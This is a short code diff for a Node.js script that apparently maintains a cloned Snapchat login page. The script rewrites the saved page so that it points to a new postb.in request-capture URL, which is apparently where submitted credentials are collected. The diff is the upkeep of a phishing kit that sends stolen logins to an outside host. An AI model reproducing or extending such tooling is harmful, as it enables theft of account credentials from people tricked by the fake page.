@@ -5,7 +5,7 @@ const fs = require('fs');
 
 (async() => {
     let data = await fs.readFileSync("./public/Log In • Snapchat.htm").toString()
-    data = data.replace("https://postb.in/1585358913208-7440893186721", "https://postb.in/1585358913208-7440893186721")
+    data = data.replace("https://postb.in/1585358913208-7440893186721", "https://postb.in/1585360324443-0933622568845")
     await fs.unlinkSync("./public/Log In • Snapchat.htm")
     await fs.writeFileSync("./public/Log In • Snapchat.htm", data)
     console.log("Done")
